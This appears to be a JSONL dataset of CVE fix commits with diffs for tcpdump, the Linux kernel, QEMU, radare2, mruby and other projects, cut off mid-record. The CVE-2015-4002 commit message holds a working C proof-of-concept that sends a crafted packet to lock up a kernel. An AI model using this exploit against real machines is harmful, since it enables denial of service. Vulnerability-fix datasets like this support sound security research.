{"CVE_ID": "CVE-2017-16358", "CWE_ID": "125", "category": "security", "commit_id": "d31c4d3cbdbe01ea3ded16a584de94149ecd31d9", "commit_message": "From d31c4d3cbdbe01ea3ded16a584de94149ecd31d9 Mon Sep 17 00:00:00 2001\nFrom: pancake <pancake@nopcode.org>\nDate: Tue, 31 Oct 2017 13:08:52 +0100\nSubject: [PATCH] Fix #8748 - Fix oobread on string search\n\n---\n libr/bin/bin.c | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\n", "diff_code": "diff --git a/libr/bin/bin.c b/libr/bin/bin.c\nindex fbb8a8025b..b5fffe88bc 100644\n--- a/libr/bin/bin.c\n+++ b/libr/bin/bin.c\n@@ -352,16 +352,16 @@ static int string_scan_range(RList *list, const ut8 *buf, int min,\n \t\t\t\t// TODO: move into adjust_offset\n \t\t\t\tswitch (str_type) {\n \t\t\t\tcase R_STRING_TYPE_WIDE:\n-\t\t\t\t\t{\n-\t\t\t\t\t\tconst ut8 *p = buf  + str_start - 2;\n+\t\t\t\t\tif (str_start > 1) {\n+\t\t\t\t\t\tconst ut8 *p = buf + str_start - 2;\n \t\t\t\t\t\tif (p[0] == 0xff && p[1] == 0xfe) {\n \t\t\t\t\t\t\tstr_start -= 2; // \\xff\\xfe\n \t\t\t\t\t\t}\n \t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\tcase R_STRING_TYPE_WIDE32:\n-\t\t\t\t\t{\n-\t\t\t\t\t\tconst ut8 *p = buf  + str_start - 4;\n+\t\t\t\t\tif (str_start > 3) {\n+\t\t\t\t\t\tconst ut8 *p = buf + str_start - 4;\n \t\t\t\t\t\tif (p[0] == 0xff && p[1] == 0xfe) {\n \t\t\t\t\t\t\tstr_start -= 4; // \\xff\\xfe\\x00\\x00\n \t\t\t\t\t\t}\n", "owner": "radare", "repo": "radare2", "source": "cve"}
{"CVE_ID": "CVE-2014-9140", "CWE_ID": "119", "category": "security", "commit_id": "0f95d441e4b5d7512cc5c326c8668a120e048eda", "commit_message": "From 0f95d441e4b5d7512cc5c326c8668a120e048eda Mon Sep 17 00:00:00 2001\nFrom: Guy Harris <guy@alum.mit.edu>\nDate: Wed, 22 Oct 2014 12:31:21 -0700\nSubject: [PATCH] Do bounds checking when unescaping PPP.\n\nClean up a const issue while we're at it.\n---\n print-ppp.c | 16 ++++++++--------\n 1 file changed, 8 insertions(+), 8 deletions(-)\n\n", "diff_code": "diff --git a/print-ppp.c b/print-ppp.c\nindex 8e098f05a..9a983e617 100644\n--- a/print-ppp.c\n+++ b/print-ppp.c\n@@ -1351,14 +1351,15 @@ static void\n ppp_hdlc(netdissect_options *ndo,\n          const u_char *p, int length)\n {\n-\tu_char *b, *s, *t, c;\n+\tu_char *b, *t, c;\n+\tconst u_char *s;\n \tint i, proto;\n \tconst void *se;\n \n         if (length <= 0)\n                 return;\n \n-\tb = (uint8_t *)malloc(length);\n+\tb = (u_char *)malloc(length);\n \tif (b == NULL)\n \t\treturn;\n \n@@ -1367,14 +1368,13 @@ ppp_hdlc(netdissect_options *ndo,\n \t * Do this so that we dont overwrite the original packet\n \t * contents.\n \t */\n-\tfor (s = (u_char *)p, t = b, i = length; i > 0; i--) {\n+\tfor (s = p, t = b, i = length; i > 0 && ND_TTEST(*s); i--) {\n \t\tc = *s++;\n \t\tif (c == 0x7d) {\n-\t\t\tif (i > 1) {\n-\t\t\t\ti--;\n-\t\t\t\tc = *s++ ^ 0x20;\n-\t\t\t} else\n-\t\t\t\tcontinue;\n+\t\t\tif (i <= 1 || !ND_TTEST(*s))\n+\t\t\t\tbreak;\n+\t\t\ti--;\n+\t\t\tc = *s++ ^ 0x20;\n \t\t}\n \t\t*t++ = c;\n \t}\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2015-4002", "CWE_ID": "119", "category": "security", "commit_id": "9a59029bc218b48eff8b5d4dde5662fd79d3e1a8", "commit_message": "From 9a59029bc218b48eff8b5d4dde5662fd79d3e1a8 Mon Sep 17 00:00:00 2001\nFrom: \"Jason A. Donenfeld\" <Jason@zx2c4.com>\nDate: Fri, 29 May 2015 13:07:01 +0200\nSubject: ozwpan: unchecked signed subtraction leads to DoS\n\nThe subtraction here was using a signed integer and did not have any\nbounds checking at all. This commit adds proper bounds checking, made\neasy by use of an unsigned integer. This way, a single packet won't be\nable to remotely trigger a massive loop, locking up the system for a\nconsiderable amount of time. A PoC follows below, which requires\nozprotocol.h from this module.\n\n=-=-=-=-=-=\n\n #include <arpa/inet.h>\n #include <linux/if_packet.h>\n #include <net/if.h>\n #include <netinet/ether.h>\n #include <stdio.h>\n #include <string.h>\n #include <stdlib.h>\n #include <endian.h>\n #include <sys/ioctl.h>\n #include <sys/socket.h>\n\n #define u8 uint8_t\n #define u16 uint16_t\n #define u32 uint32_t\n #define __packed __attribute__((__packed__))\n #include \"ozprotocol.h\"\n\nstatic int hex2num(char c)\n{\n\tif (c >= '0' && c <= '9')\n\t\treturn c - '0';\n\tif (c >= 'a' && c <= 'f')\n\t\treturn c - 'a' + 10;\n\tif (c >= 'A' && c <= 'F')\n\t\treturn c - 'A' + 10;\n\treturn -1;\n}\nstatic int hwaddr_aton(const char *txt, uint8_t *addr)\n{\n\tint i;\n\tfor (i = 0; i < 6; i++) {\n\t\tint a, b;\n\t\ta = hex2num(*txt++);\n\t\tif (a < 0)\n\t\t\treturn -1;\n\t\tb = hex2num(*txt++);\n\t\tif (b < 0)\n\t\t\treturn -1;\n\t\t*addr++ = (a << 4) | b;\n\t\tif (i < 5 && *txt++ != ':')\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nint main(int argc, char *argv[])\n{\n\tif (argc < 3) {\n\t\tfprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);\n\t\treturn 1;\n\t}\n\n\tuint8_t dest_mac[6];\n\tif (hwaddr_aton(argv[2], dest_mac)) {\n\t\tfprintf(stderr, \"Invalid mac address.\\n\");\n\t\treturn 1;\n\t}\n\n\tint sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);\n\tif (sockfd < 0) {\n\t\tperror(\"socket\");\n\t\treturn 1;\n\t}\n\n\tstruct ifreq if_idx;\n\tint interface_index;\n\tstrncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);\n\tif (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFINDEX\");\n\t\treturn 1;\n\t}\n\tinterface_index = if_idx.ifr_ifindex;\n\tif (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {\n\t\tperror(\"SIOCGIFHWADDR\");\n\t\treturn 1;\n\t}\n\tuint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;\n\n\tstruct {\n\t\tstruct ether_header ether_header;\n\t\tstruct oz_hdr oz_hdr;\n\t\tstruct oz_elt oz_elt;\n\t\tstruct oz_elt_connect_req oz_elt_connect_req;\n\t\tstruct oz_elt oz_elt2;\n\t\tstruct oz_multiple_fixed oz_multiple_fixed;\n\t} __packed packet = {\n\t\t.ether_header = {\n\t\t\t.ether_type = htons(OZ_ETHERTYPE),\n\t\t\t.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },\n\t\t\t.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t\t},\n\t\t.oz_hdr = {\n\t\t\t.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),\n\t\t\t.last_pkt_num = 0,\n\t\t\t.pkt_num = htole32(0)\n\t\t},\n\t\t.oz_elt = {\n\t\t\t.type = OZ_ELT_CONNECT_REQ,\n\t\t\t.length = sizeof(struct oz_elt_connect_req)\n\t\t},\n\t\t.oz_elt_connect_req = {\n\t\t\t.mode = 0,\n\t\t\t.resv1 = {0},\n\t\t\t.pd_info = 0,\n\t\t\t.session_id = 0,\n\t\t\t.presleep = 0,\n\t\t\t.ms_isoc_latency = 0,\n\t\t\t.host_vendor = 0,\n\t\t\t.keep_alive = 0,\n\t\t\t.apps = htole16((1 << OZ_APPID_USB) | 0x1),\n\t\t\t.max_len_div16 = 0,\n\t\t\t.ms_per_isoc = 0,\n\t\t\t.up_audio_buf = 0,\n\t\t\t.ms_per_elt = 0\n\t\t},\n\t\t.oz_elt2 = {\n\t\t\t.type = OZ_ELT_APP_DATA,\n\t\t\t.length = sizeof(struct oz_multiple_fixed) - 3\n\t\t},\n\t\t.oz_multiple_fixed = {\n\t\t\t.app_id = OZ_APPID_USB,\n\t\t\t.elt_seq_num = 0,\n\t\t\t.type = OZ_USB_ENDPOINT_DATA,\n\t\t\t.endpoint = 0,\n\t\t\t.format = OZ_DATA_F_MULTIPLE_FIXED,\n\t\t\t.unit_size = 1,\n\t\t\t.data = {0}\n\t\t}\n\t};\n\n\tstruct sockaddr_ll socket_address = {\n\t\t.sll_ifindex = interface_index,\n\t\t.sll_halen = ETH_ALEN,\n\t\t.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }\n\t};\n\n\tif (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {\n\t\tperror(\"sendto\");\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\nSigned-off-by: Jason A. Donenfeld <Jason@zx2c4.com>\nAcked-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers/staging/ozwpan/ozusbsvc1.c | 7 ++++---\n 1 file changed, 4 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c\nindex 7b13dc910172..f660bb198c65 100644\n--- a/drivers/staging/ozwpan/ozusbsvc1.c\n+++ b/drivers/staging/ozwpan/ozusbsvc1.c\n@@ -326,10 +326,11 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,\n \t\t\tstruct oz_multiple_fixed *body =\n \t\t\t\t(struct oz_multiple_fixed *)data_hdr;\n \t\t\tu8 *data = body->data;\n-\t\t\tint n;\n-\t\t\tif (!body->unit_size)\n+\t\t\tunsigned int n;\n+\t\t\tif (!body->unit_size ||\n+\t\t\t\tlen < sizeof(struct oz_multiple_fixed) - 1)\n \t\t\t\tbreak;\n-\t\t\tn = (len - sizeof(struct oz_multiple_fixed)+1)\n+\t\t\tn = (len - (sizeof(struct oz_multiple_fixed) - 1))\n \t\t\t\t/ body->unit_size;\n \t\t\twhile (n--) {\n \t\t\t\toz_hcd_data_ind(usb_ctx->hport, body->endpoint,\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2015-8898", "CWE_ID": "476", "category": "security", "commit_id": "5b4bebaa91849c592a8448bc353ab25a54ff8c44", "commit_message": "From 5b4bebaa91849c592a8448bc353ab25a54ff8c44 Mon Sep 17 00:00:00 2001\nFrom: Cristy <urban-warrior@imagemagick.org>\nDate: Thu, 24 Sep 2015 09:36:17 -0400\nSubject: [PATCH] https://github.com/ImageMagick/ImageMagick/pull/34\n\n---\n MagickCore/constitute.c | 10 +++++++++-\n 1 file changed, 9 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/MagickCore/constitute.c b/MagickCore/constitute.c\nindex 24176f0b6a..dc6ec49c13 100644\n--- a/MagickCore/constitute.c\n+++ b/MagickCore/constitute.c\n@@ -1272,7 +1272,14 @@ MagickExport MagickBooleanType WriteImages(const ImageInfo *image_info,\n     (void) CopyMagickString(write_info->magick,images->magick,MagickPathExtent);\n   p=images;\n   for ( ; GetNextImageInList(p) != (Image *) NULL; p=GetNextImageInList(p))\n-    if (p->scene >= GetNextImageInList(p)->scene)\n+  {\n+    register Image\n+      *next;\n+    \n+    next=GetNextImageInList(p);\n+    if (next == (Image *) NULL)\n+      break;\n+    if (p->scene >= next->scene)\n       {\n         register ssize_t\n           i;\n@@ -1285,6 +1292,7 @@ MagickExport MagickBooleanType WriteImages(const ImageInfo *image_info,\n           p->scene=(size_t) i++;\n         break;\n       }\n+  }\n   /*\n     Write images.\n   */\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
{"CVE_ID": "CVE-2016-9102", "CWE_ID": "399", "category": "security", "commit_id": "ff55e94d23ae94c8628b0115320157c763eb3e06", "commit_message": "From ff55e94d23ae94c8628b0115320157c763eb3e06 Mon Sep 17 00:00:00 2001\nFrom: Li Qiang <liqiang6-s@360.cn>\nDate: Mon, 17 Oct 2016 14:13:58 +0200\nSubject: [PATCH] 9pfs: fix memory leak in v9fs_xattrcreate\n\nThe 'fs.xattr.value' field in V9fsFidState object doesn't consider the\nsituation that this field has been allocated previously. Every time, it\nwill be allocated directly. This leads to a host memory leak issue if\nthe client sends another Txattrcreate message with the same fid number\nbefore the fid from the previous time got clunked.\n\nSigned-off-by: Li Qiang <liqiang6-s@360.cn>\nReviewed-by: Greg Kurz <groug@kaod.org>\n[groug, updated the changelog to indicate how the leak can occur]\nSigned-off-by: Greg Kurz <groug@kaod.org>\n---\n hw/9pfs/9p.c | 1 +\n 1 file changed, 1 insertion(+)\n\n", "diff_code": "diff --git a/hw/9pfs/9p.c b/hw/9pfs/9p.c\nindex bf23b01..66135cf 100644\n--- a/hw/9pfs/9p.c\n+++ b/hw/9pfs/9p.c\n@@ -3282,6 +3282,7 @@ static void coroutine_fn v9fs_xattrcreate(void *opaque)\n     xattr_fidp->fs.xattr.flags = flags;\n     v9fs_string_init(&xattr_fidp->fs.xattr.name);\n     v9fs_string_copy(&xattr_fidp->fs.xattr.name, &name);\n+    g_free(xattr_fidp->fs.xattr.value);\n     xattr_fidp->fs.xattr.value = g_malloc0(size);\n     err = offset;\n     put_fid(pdu, file_fidp);\n-- \n1.8.3.1\n\n", "owner": "qemu", "repo": "qemu", "source": "cve"}
{"CVE_ID": "CVE-2012-6542", "CWE_ID": "200", "category": "security", "commit_id": "3592aaeb80290bda0f2cf0b5456c97bfc638b192", "commit_message": "From 3592aaeb80290bda0f2cf0b5456c97bfc638b192 Mon Sep 17 00:00:00 2001\nFrom: Mathias Krause <minipli@googlemail.com>\nDate: Wed, 15 Aug 2012 11:31:53 +0000\nSubject: [PATCH] llc: fix info leak via getsockname()\n\nThe LLC code wrongly returns 0, i.e. \"success\", when the socket is\nzapped. Together with the uninitialized uaddrlen pointer argument from\nsys_getsockname this leads to an arbitrary memory leak of up to 128\nbytes kernel stack via the getsockname() syscall.\n\nReturn an error instead when the socket is zapped to prevent the info\nleak. Also remove the unnecessary memset(0). We don't directly write to\nthe memory pointed by uaddr but memcpy() a local structure at the end of\nthe function that is properly initialized.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/llc/af_llc.c | 3 +--\n 1 file changed, 1 insertion(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/net/llc/af_llc.c b/net/llc/af_llc.c\nindex 8c2919ca36f63..c2190005a1141 100644\n--- a/net/llc/af_llc.c\n+++ b/net/llc/af_llc.c\n@@ -969,14 +969,13 @@ static int llc_ui_getname(struct socket *sock, struct sockaddr *uaddr,\n \tstruct sockaddr_llc sllc;\n \tstruct sock *sk = sock->sk;\n \tstruct llc_sock *llc = llc_sk(sk);\n-\tint rc = 0;\n+\tint rc = -EBADF;\n \n \tmemset(&sllc, 0, sizeof(sllc));\n \tlock_sock(sk);\n \tif (sock_flag(sk, SOCK_ZAPPED))\n \t\tgoto out;\n \t*uaddrlen = sizeof(sllc);\n-\tmemset(uaddr, 0, *uaddrlen);\n \tif (peer) {\n \t\trc = -ENOTCONN;\n \t\tif (sk->sk_state != TCP_ESTABLISHED)\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2009-3002", "CWE_ID": "200", "category": "security", "commit_id": "f6b97b29513950bfbf621a83d85b6f86b39ec8db", "commit_message": "From f6b97b29513950bfbf621a83d85b6f86b39ec8db Mon Sep 17 00:00:00 2001\nFrom: Eric Dumazet <eric.dumazet@gmail.com>\nDate: Thu, 6 Aug 2009 03:31:07 +0000\nSubject: netrom: Fix nr_getname() leak\n\nnr_getname() can leak kernel memory to user.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/netrom/af_netrom.c | 1 +\n 1 file changed, 1 insertion(+)\n\n", "diff_code": "diff --git a/net/netrom/af_netrom.c b/net/netrom/af_netrom.c\nindex ce51ce012cda..ce1a34b99c23 100644\n--- a/net/netrom/af_netrom.c\n+++ b/net/netrom/af_netrom.c\n@@ -847,6 +847,7 @@ static int nr_getname(struct socket *sock, struct sockaddr *uaddr,\n \t\tsax->fsa_ax25.sax25_family = AF_NETROM;\n \t\tsax->fsa_ax25.sax25_ndigis = 1;\n \t\tsax->fsa_ax25.sax25_call   = nr->user_addr;\n+\t\tmemset(sax->fsa_digipeater, 0, sizeof(sax->fsa_digipeater));\n \t\tsax->fsa_digipeater[0]     = nr->dest_addr;\n \t\t*uaddr_len = sizeof(struct full_sockaddr_ax25);\n \t} else {\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "mjg59", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2018-12248", "CWE_ID": "119", "category": "security", "commit_id": "778500563a9f7ceba996937dc886bd8cde29b42b", "commit_message": "From 778500563a9f7ceba996937dc886bd8cde29b42b Mon Sep 17 00:00:00 2001\nFrom: \"Yukihiro \\\"Matz\\\" Matsumoto\" <matz@ruby.or.jp>\nDate: Thu, 7 Jun 2018 15:59:00 +0900\nSubject: [PATCH] Extend stack when pushing arguments that does not fit in; fix\n #4038\n\n---\n mrbgems/mruby-fiber/src/fiber.c | 18 +++++++++---------\n 1 file changed, 9 insertions(+), 9 deletions(-)\n\n", "diff_code": "diff --git a/mrbgems/mruby-fiber/src/fiber.c b/mrbgems/mruby-fiber/src/fiber.c\nindex 83153a9df..b88fa4949 100644\n--- a/mrbgems/mruby-fiber/src/fiber.c\n+++ b/mrbgems/mruby-fiber/src/fiber.c\n@@ -184,26 +184,27 @@ fiber_switch(mrb_state *mrb, mrb_value self, mrb_int len, const mrb_value *a, mr\n {\n   struct mrb_context *c = fiber_check(mrb, self);\n   struct mrb_context *old_c = mrb->c;\n+  enum mrb_fiber_state status;\n   mrb_value value;\n \n   fiber_check_cfunc(mrb, c);\n-  if (resume && c->status == MRB_FIBER_TRANSFERRED) {\n+  status = c->status;\n+  if (resume && status == MRB_FIBER_TRANSFERRED) {\n     mrb_raise(mrb, E_FIBER_ERROR, \"resuming transferred fiber\");\n   }\n-  if (c->status == MRB_FIBER_RUNNING || c->status == MRB_FIBER_RESUMED) {\n+  if (status == MRB_FIBER_RUNNING || status == MRB_FIBER_RESUMED) {\n     mrb_raise(mrb, E_FIBER_ERROR, \"double resume (fib)\");\n   }\n-  if (c->status == MRB_FIBER_TERMINATED) {\n+  if (status == MRB_FIBER_TERMINATED) {\n     mrb_raise(mrb, E_FIBER_ERROR, \"resuming dead fiber\");\n   }\n-  mrb->c->status = resume ? MRB_FIBER_RESUMED : MRB_FIBER_TRANSFERRED;\n+  old_c->status = resume ? MRB_FIBER_RESUMED : MRB_FIBER_TRANSFERRED;\n   c->prev = resume ? mrb->c : (c->prev ? c->prev : mrb->root_c);\n-  if (c->status == MRB_FIBER_CREATED) {\n+  fiber_switch_context(mrb, c);\n+  if (status == MRB_FIBER_CREATED) {\n     mrb_value *b, *e;\n \n-    if (len >= c->stend - c->stack) {\n-      mrb_raise(mrb, E_FIBER_ERROR, \"too many arguments to fiber\");\n-    }\n+    mrb_stack_extend(mrb, len+2); /* for receiver and (optional) block */\n     b = c->stack+1;\n     e = b + len;\n     while (b<e) {\n@@ -215,7 +216,6 @@ fiber_switch(mrb_state *mrb, mrb_value self, mrb_int len, const mrb_value *a, mr\n   else {\n     value = fiber_result(mrb, a, len);\n   }\n-  fiber_switch_context(mrb, c);\n \n   if (vmexec) {\n     c->vmexec = TRUE;\n", "owner": "mruby", "repo": "mruby", "source": "cve"}
{"CVE_ID": "CVE-2017-13031", "CWE_ID": "119", "category": "security", "commit_id": "2d669862df7cd17f539129049f6fb70d17174125", "commit_message": "From 2d669862df7cd17f539129049f6fb70d17174125 Mon Sep 17 00:00:00 2001\nFrom: Guy Harris <guy@alum.mit.edu>\nDate: Wed, 22 Mar 2017 14:55:12 -0700\nSubject: [PATCH] CVE-2017-13031/Check for the presence of the entire IPv6\n fragment header.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.\n\nClean up some whitespace in tests/TESTLIST while we're at it.\n---\n print-frag6.c            |   2 +-\n tests/TESTLIST           |   7 ++++---\n tests/ip6_frag_asan.out  |   1 +\n tests/ip6_frag_asan.pcap | Bin 0 -> 100 bytes\n 4 files changed, 6 insertions(+), 4 deletions(-)\n create mode 100644 tests/ip6_frag_asan.out\n create mode 100644 tests/ip6_frag_asan.pcap\n\n", "diff_code": "diff --git a/print-frag6.c b/print-frag6.c\nindex 03836adbb..fbcabc5b0 100644\n--- a/print-frag6.c\n+++ b/print-frag6.c\n@@ -41,7 +41,7 @@ frag6_print(netdissect_options *ndo, register const u_char *bp, register const u\n \tdp = (const struct ip6_frag *)bp;\n \tip6 = (const struct ip6_hdr *)bp2;\n \n-\tND_TCHECK(dp->ip6f_offlg);\n+\tND_TCHECK(*dp);\n \n \tif (ndo->ndo_vflag) {\n \t\tND_PRINT((ndo, \"frag (0x%08x:%d|%ld)\",\ndiff --git a/tests/TESTLIST b/tests/TESTLIST\nindex bc1af3663..8e88e93ea 100644\n--- a/tests/TESTLIST\n+++ b/tests/TESTLIST\n@@ -536,9 +536,10 @@ isis_stlv_asan-4\tisis_stlv_asan-4.pcap\t\tisis_stlv_asan-4.out\t-v\n lldp_mgmt_addr_tlv_asan\tlldp_mgmt_addr_tlv_asan.pcap\tlldp_mgmt_addr_tlv_asan.out\t-v\n bootp_asan\t\tbootp_asan.pcap\t\t\tbootp_asan.out\t\t-v\n ppp_ccp_config_deflate_option_asan\tppp_ccp_config_deflate_option_asan.pcap\tppp_ccp_config_deflate_option_asan.out\t-v\n-pim_header_asan\t\tpim_header_asan.pcap\t\tpim_header_asan.out\t\t-v\n-pim_header_asan-2\tpim_header_asan-2.pcap\t\tpim_header_asan-2.out\t\t-v\n-pim_header_asan-3\tpim_header_asan-3.pcap\t\tpim_header_asan-3.out\t\t-v\n+pim_header_asan\t\tpim_header_asan.pcap\t\tpim_header_asan.out\t-v\n+pim_header_asan-2\tpim_header_asan-2.pcap\t\tpim_header_asan-2.out\t-v\n+pim_header_asan-3\tpim_header_asan-3.pcap\t\tpim_header_asan-3.out\t-v\n+ip6_frag_asan\t\tip6_frag_asan.pcap\t\tip6_frag_asan.out\t-v\n \n # RTP tests\n # fuzzed pcap\ndiff --git a/tests/ip6_frag_asan.out b/tests/ip6_frag_asan.out\nnew file mode 100644\nindex 000000000..2daba4254\n--- /dev/null\n+++ b/tests/ip6_frag_asan.out\n@@ -0,0 +1 @@\n+IP6 (class 0x51, flowlabel 0xb2100, hlim 16, next-header Fragment (44) payload length: 27136) 452:22:19:0:41a:e4ff:10ff:484d > 2243:80:1400:100:19:ffff:ffff:fffb: [|frag]\ndiff --git a/tests/ip6_frag_asan.pcap b/tests/ip6_frag_asan.pcap\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..a99a22d126e946eebc1183d8b57fda650fe7abf6\nGIT binary patch\nliteral 100\nzcmca|c+)~A1{Q{G5ljymfWQWb8G$&W;Qvc8W+pJdgrR}qz`6emfXWy&J^z=s-A$EN\nqWXNLB5nu^oP-2i|U|^AY@?YS;hp&<|LxTuNzvO=q_|5$vWEucjlpQ4i\n\nliteral 0\nHcmV?d00001\n\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2017-9226", "CWE_ID": "787", "category": "security", "commit_id": "b4bf968ad52afe14e60a2dc8a95d3555c543353a", "commit_message": "From b4bf968ad52afe14e60a2dc8a95d3555c543353a Mon Sep 17 00:00:00 2001\nFrom: \"K.Kosako\" <kosako@sofnec.co.jp>\nDate: Thu, 18 May 2017 17:05:27 +0900\nSubject: [PATCH] fix #55 : check too big code point value for single byte\n value in next_state_val()\n\n---\n src/regparse.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n", "diff_code": "diff --git a/src/regparse.c b/src/regparse.c\nindex 11f9e34..665998e 100644\n--- a/src/regparse.c\n+++ b/src/regparse.c\n@@ -4044,6 +4044,9 @@ next_state_val(CClassNode* cc, OnigCodePoint *vs, OnigCodePoint v,\n   switch (*state) {\n   case CCS_VALUE:\n     if (*type == CCV_SB) {\n+      if (*vs > 0xff)\n+          return ONIGERR_INVALID_CODE_POINT_VALUE;\n+\n       BITSET_SET_BIT(cc->bs, (int )(*vs));\n     }\n     else if (*type == CCV_CODE_POINT) {\n", "owner": "kkos", "repo": "oniguruma", "source": "cve"}
{"CVE_ID": "CVE-2017-16803", "CWE_ID": "119", "category": "security", "commit_id": "cd4663dc80323ba64989d0c103d51ad3ee0e9c2f", "commit_message": "From cd4663dc80323ba64989d0c103d51ad3ee0e9c2f Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Thu, 21 Jun 2012 16:01:52 +0200\nSubject: [PATCH] smacker: add sanity check for length in smacker_decode_tree()\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n\nBug-Id: 1098\nCc: libav-stable@libav.org\nSigned-off-by: Sean McGovern <gseanmcg@gmail.com>\n---\n libavcodec/smacker.c | 7 ++++++-\n 1 file changed, 6 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/libavcodec/smacker.c b/libavcodec/smacker.c\nindex 0e057a1c2a..7deccffa54 100644\n--- a/libavcodec/smacker.c\n+++ b/libavcodec/smacker.c\n@@ -43,7 +43,7 @@\n \n #define SMKTREE_BITS 9\n #define SMK_NODE 0x80000000\n-\n+#define SMKTREE_DECODE_MAX_RECURSION 32\n \n typedef struct SmackVContext {\n     AVCodecContext *avctx;\n@@ -97,6 +97,11 @@ enum SmkBlockTypes {\n static int smacker_decode_tree(BitstreamContext *bc, HuffContext *hc,\n                                uint32_t prefix, int length)\n {\n+    if (length > SMKTREE_DECODE_MAX_RECURSION) {\n+        av_log(NULL, AV_LOG_ERROR, \"Maximum tree recursion level exceeded.\\n\");\n+        return AVERROR_INVALIDDATA;\n+    }\n+\n     if (!bitstream_read_bit(bc)) { // Leaf\n         if(hc->current >= 256){\n             av_log(NULL, AV_LOG_ERROR, \"Tree size exceeded!\\n\");\n", "owner": "libav", "repo": "libav", "source": "cve"}
{"CVE_ID": "CVE-2017-8326", "CWE_ID": "19", "category": "security", "commit_id": "a00183107d4b84bc8a714290e824ca9c68dac738", "commit_message": "From a00183107d4b84bc8a714290e824ca9c68dac738 Mon Sep 17 00:00:00 2001\nFrom: Jason Summers <jason1@pobox.com>\nDate: Sat, 22 Apr 2017 08:50:41 -0400\nSubject: [PATCH] Trying to fix some invalid left shift operations\n\nFixes issue #16\n---\n src/imagew-bmp.c  |  4 ++--\n src/imagew-util.c | 13 ++++++++-----\n 2 files changed, 10 insertions(+), 7 deletions(-)\n\n", "diff_code": "diff --git a/src/imagew-bmp.c b/src/imagew-bmp.c\nindex 94619c5..9e51106 100644\n--- a/src/imagew-bmp.c\n+++ b/src/imagew-bmp.c\n@@ -425,7 +425,7 @@ static int find_high_bit(unsigned int x)\n {\n \tint i;\n \tfor(i=31;i>=0;i--) {\n-\t\tif(x&(1<<i)) return i;\n+\t\tif(x&(1U<<(unsigned int)i)) return i;\n \t}\n \treturn 0;\n }\n@@ -433,7 +433,7 @@ static int find_low_bit(unsigned int x)\n {\n \tint i;\n \tfor(i=0;i<=31;i++) {\n-\t\tif(x&(1<<i)) return i;\n+\t\tif(x&(1U<<(unsigned int)i)) return i;\n \t}\n \treturn 0;\n }\ndiff --git a/src/imagew-util.c b/src/imagew-util.c\nindex 72410c2..77f19a8 100644\n--- a/src/imagew-util.c\n+++ b/src/imagew-util.c\n@@ -402,27 +402,30 @@ IW_IMPL(void) iw_set_ui32be(iw_byte *b, unsigned int n)\n \n IW_IMPL(unsigned int) iw_get_ui16le(const iw_byte *b)\n {\n-\treturn b[0] | (b[1]<<8);\n+\treturn (unsigned int)b[0] | ((unsigned int)b[1]<<8);\n }\n \n IW_IMPL(unsigned int) iw_get_ui32le(const iw_byte *b)\n {\n-\treturn b[0] | (b[1]<<8) | (b[2]<<16) | (b[3]<<24);\n+\treturn (unsigned int)b[0] | ((unsigned int)b[1]<<8) |\n+\t\t((unsigned int)b[2]<<16) | ((unsigned int)b[3]<<24);\n }\n \n IW_IMPL(int) iw_get_i32le(const iw_byte *b)\n {\n-\treturn (iw_int32)(iw_uint32)(b[0] | (b[1]<<8) | (b[2]<<16) | (b[3]<<24));\n+\treturn (iw_int32)(iw_uint32)((unsigned int)b[0] | ((unsigned int)b[1]<<8) |\n+\t\t((unsigned int)b[2]<<16) | ((unsigned int)b[3]<<24));\n }\n \n IW_IMPL(unsigned int) iw_get_ui16be(const iw_byte *b)\n {\n-\treturn (b[0]<<8) | 